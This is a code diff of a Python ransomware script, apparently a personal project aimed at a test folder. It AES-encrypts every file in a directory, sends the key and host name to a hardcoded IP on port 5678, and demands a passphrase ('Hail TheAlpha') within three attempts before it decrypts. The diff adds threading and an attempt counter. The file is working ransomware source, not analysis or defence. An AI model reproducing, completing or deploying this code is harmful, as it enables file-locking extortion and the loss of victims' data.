@@ -3,7 +3,7 @@ import random
 from Crypto.Cipher import AES
 import base64
 import socket
-import pathlib
+import threading
 
 
 # KEY GENERATION
@@ -116,8 +116,8 @@ def file_encrypt(key, iv, file_path_list):
             with open(file_path, 'wb') as f2:
                 f2.write(encrypted)
 
-        except:
-            pass
+        except Exception as e:
+            print(f'file not encrypted {file_path} {e}')
 
         add_extension(file_path)
 
@@ -146,24 +146,30 @@ def main_encrypt(key, iv, director):
 
 
 # MAIN DECRYPT FUNCTION
-def main_decrypt(key, iv, director):
-    verify = str(input('Enter the Key: '))
-    if verify == 'please decrypt':
-        files_list = file_listing(director)
-        file_decrypt(key, iv, files_list)
-    else:
-        main_decrypt(key, iv, director)
+def main_decrypt(key, iv, director, count):
+    print(f'{count} attempts left!!!')
+    if count > 0:
+        verify = str(input('Enter the Key: '))
+        if verify == 'Hail TheAlpha':
+            files_list = file_listing(director)
+            file_decrypt(key, iv, files_list)
+        else:
+            count -= 1
+            main_decrypt(key, iv, director, count)
 
 
 if __name__ == '__main__':
     # directory = os.environ['USERPROFILE'] + '\\Desktop' + '\\TEST'
     directory = '/Users/jithendranadh/PycharmProjects/Ransomwar/TEST'
     host = os.getenv('COMPUTERNAME')
-    IP_ADDRESS = '192.168.162.190'
+    IP_ADDRESS = '192.168.121.190'
     PORT = 5678
     key = generate_key(16)
     iv = generate_iv()
     data_transfer(key, iv, host)
-
-    main_encrypt(key, iv, directory)
-    main_decrypt(key, iv, directory)
+    t = threading.Thread(target=main_encrypt, args=(key, iv, directory))
+    t.daemon = True
+    t.start()
+    p = threading.Thread(target=main_decrypt, args=(key, iv, directory, 3))
+    p.daemon = False
+    p.start()
